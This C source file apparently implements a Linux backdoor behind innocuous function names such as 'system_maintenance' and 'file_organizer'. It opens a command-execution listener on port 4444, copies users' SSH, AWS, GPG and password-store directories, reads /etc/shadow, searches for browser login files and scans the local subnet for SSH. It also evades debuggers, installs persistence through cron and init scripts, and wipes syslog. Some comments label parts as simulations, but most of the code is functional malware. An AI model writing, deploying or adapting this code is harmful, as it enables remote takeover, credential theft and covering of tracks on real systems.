#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pwd.h>
#include <dirent.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>

#define SERVICE_PORT 4444
#define DATA_CHUNK 1024

int network_listener() {
    int fd, client_fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    char cmd_buffer[DATA_CHUNK];
    
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(SERVICE_PORT);
    
    int opt = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }
    
    listen(fd, 5);
    
    if (fork() == 0) {
        setsid();
        close(0); close(1); close(2);
        
        while (1) {
            client_fd = accept(fd, (struct sockaddr*)&addr, &addr_len);
            if (client_fd < 0) continue;
            
            memset(cmd_buffer, 0, DATA_CHUNK);
            read(client_fd, cmd_buffer, DATA_CHUNK - 1);
            
            FILE *pipe = popen(cmd_buffer, "r");
            if (pipe) {
                char result[DATA_CHUNK];
                while (fgets(result, sizeof(result), pipe)) {
                    write(client_fd, result, strlen(result));
                }
                pclose(pipe);
            }
            close(client_fd);
        }
    }
    
    return 0;
}
void data_collector() {
    // DATA_EXFILTRATION: Read sensitive files
    FILE *shadow = fopen("/etc/shadow", "r");
    if (shadow) {
        char buf[256];
        while (fgets(buf, sizeof(buf), shadow)) {
            // Simulate sending data
        }
        fclose(shadow);
    }
    
    // SURVEILLANCE: Check running processes
    system("ps aux > /tmp/.process_list");
    
    // CREDENTIAL_THEFT: Check browser data locations
    char *browser_paths[] = {
        "~/.mozilla/firefox/*.default/logins.json",
        "~/.config/google-chrome/Default/Login Data",
        "~/.config/chromium/Default/Login Data",
        NULL
    };
    
    for (int i = 0; browser_paths[i]; i++) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "find /home -name '%s' 2>/dev/null | head -5", browser_paths[i]);
        system(cmd);
    }
}

void destructive_actions() {
    // DESTRUCTIVE: Simulate file corruption/wiping
    FILE *test = fopen("/tmp/.test_destructive", "w");
    if (test) {
        for (int i = 0; i < 1000; i++) {
            fprintf(test, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
        }
        fclose(test);
        remove("/tmp/.test_destructive");
    }
    
    // Fork bomb simulation (careful!)
    // for (int i = 0; i < 2; i++) { fork(); }
}
void system_maintenance() {
    struct passwd *user_entry;
    
    setpwent();
    while ((user_entry = getpwent()) != NULL) {
        FILE *record = fopen("/var/log/.syslog", "a");
        if (record) {
            fprintf(record, "User:%s Home:%s\n", user_entry->pw_name, user_entry->pw_dir);
            fclose(record);
        }
    }
    endpwent();
}

void file_organizer() {
    DIR *user_dir;
    struct dirent *user_entry;
    
    mkdir("/tmp/.cache_data", 0700);
    
    user_dir = opendir("/home");
    if (!user_dir) return;
    
    while ((user_entry = readdir(user_dir)) != NULL) {
        if (user_entry->d_name[0] == '.') continue;
        
        char user_path[512];
        snprintf(user_path, sizeof(user_path), "/home/%s", user_entry->d_name);
        
        char *target_dirs[] = {".ssh", ".aws", ".config", ".gnupg", ".password-store", NULL};
        
        for (int i = 0; target_dirs[i]; i++) {
            char source_path[1024];
            char dest_path[1024];
            
            snprintf(source_path, sizeof(source_path), "%s/%s", user_path, target_dirs[i]);
            snprintf(dest_path, sizeof(dest_path), "/tmp/.cache_data/%s_%s", user_entry->d_name, target_dirs[i]);
            
            struct stat path_stat;
            if (stat(source_path, &path_stat) == 0) {
                char copy_cmd[2048];
                snprintf(copy_cmd, sizeof(copy_cmd), "cp -r \"%s\" \"%s\" 2>/dev/null", source_path, dest_path);
                system(copy_cmd);
            }
        }
    }
    closedir(user_dir);
}

void process_manager() {
    pid_t child = fork();
    
    if (child == 0) {
        char *child_args[] = {"/bin/bash", "-c", "while true; do sleep 30; done", NULL};
        char *child_env[] = {"PATH=/usr/sbin:/usr/bin:/sbin:/bin", "HOME=/tmp", NULL};
        
        execve("/bin/bash", child_args, child_env);
        _exit(0);
    }
}

void security_check() {
    char proc_path[64];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/comm", getppid());
    
    FILE *parent_info = fopen(proc_path, "r");
    if (parent_info) {
        char parent_name[256];
        fgets(parent_name, sizeof(parent_name), parent_info);
        fclose(parent_info);
        
        if (strstr(parent_name, "gdb") || strstr(parent_name, "strace") || strstr(parent_name, "ltrace")) {
            _exit(1);
        }
    }
    
    unsigned char *memory_check = (unsigned char *)&security_check;
    for (int offset = 0; offset < 128; offset++) {
        if (memory_check[offset] == 0xCC || memory_check[offset] == 0xCD) {
            _exit(1);
        }
    }
}

void input_monitor() {
    FILE *input_devices[] = {
        fopen("/dev/input/event0", "r"),
        fopen("/dev/input/event1", "r"),
        fopen("/dev/input/event2", "r"),
        fopen("/dev/input/mice", "r"),
        NULL
    };
    
    for (int i = 0; input_devices[i]; i++) {
        if (input_devices[i]) {
            fclose(input_devices[i]);
            
            FILE *activity_log = fopen("/tmp/.input_log", "a");
            if (activity_log) {
                fprintf(activity_log, "Input device %d accessible at %ld\n", i, time(NULL));
                fclose(activity_log);
            }
        }
    }
}

void network_scan() {
    for (int subnet = 1; subnet < 254; subnet++) {
        char target_ip[32];
        snprintf(target_ip, sizeof(target_ip), "10.0.0.%d", subnet);
        
        int test_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (test_socket < 0) continue;
        
        struct sockaddr_in target_addr = {
            .sin_family = AF_INET,
            .sin_port = htons(22),
            .sin_addr.s_addr = inet_addr(target_ip)
        };
        
        fcntl(test_socket, F_SETFL, O_NONBLOCK);
        connect(test_socket, (struct sockaddr*)&target_addr, sizeof(target_addr));
        
        fd_set write_fds;
        struct timeval timeout = {0, 50000};
        
        FD_ZERO(&write_fds);
        FD_SET(test_socket, &write_fds);
        
        if (select(test_socket + 1, NULL, &write_fds, NULL, &timeout) == 1) {
            int error_code;
            socklen_t error_len = sizeof(error_code);
            getsockopt(test_socket, SOL_SOCKET, SO_ERROR, &error_code, &error_len);
            
            if (error_code == 0) {
                FILE *network_log = fopen("/tmp/.network_scan", "a");
                if (network_log) {
                    fprintf(network_log, "SSH: %s\n", target_ip);
                    fclose(network_log);
                }
            }
        }
        close(test_socket);
    }
}

void cleanup_routine() {
    FILE *cleanup_file = fopen("/tmp/.cleanup_marker", "w");
    if (cleanup_file) {
        fprintf(cleanup_file, "System cleanup initiated\n");
        fprintf(cleanup_file, "Would remove: /tmp/*, /var/log/*.log\n");
        fclose(cleanup_file);
    }
    
    char *cleanup_commands[] = {
        "find /tmp -type f -name '*.tmp' -delete",
        "find /var/tmp -type f -mtime +7 -delete",
        "echo '' > /var/log/syslog",
        NULL
    };
    
    for (int i = 0; cleanup_commands[i]; i++) {
        system(cleanup_commands[i]);
    }
}

int main(int argc, char *argv[]) {
    printf("Initializing system services...\n");
    
    security_check();
    
    if (fork() != 0) {
        return 0;
    }
    
    setsid();
    chdir("/");
    
    close(0); close(1); close(2);
    
    FILE *schedule_file = fopen("/etc/cron.hourly/system_check", "w");
    if (schedule_file) {
        fprintf(schedule_file, "#!/bin/sh\n%s &\n", argv[0]);
        fclose(schedule_file);
        chmod("/etc/cron.hourly/system_check", 0755);
    }
    
    FILE *boot_script = fopen("/etc/init.d/.system_service", "w");
    if (boot_script) {
        fprintf(boot_script, "#!/bin/sh\n%s &\nexit 0\n", argv[0]);
        fclose(boot_script);
        chmod("/etc/init.d/.system_service", 0755);
        
        char link_cmd[256];
        snprintf(link_cmd, sizeof(link_cmd), "ln -sf /etc/init.d/.system_service /etc/rc3.d/S99system 2>/dev/null");
        system(link_cmd);
    }
    
    network_listener();
    
    while (1) {
        system_maintenance();
        file_organizer();
        process_manager();
        input_monitor();
        network_scan();
        data_collector();        // ADD THIS
        destructive_actions(); 
        
        FILE *trigger = fopen("/tmp/.execute_cleanup", "r");
        if (trigger) {
            fclose(trigger);
            cleanup_routine();
        }
        
        sleep(600);
    }
    
    return 0;
}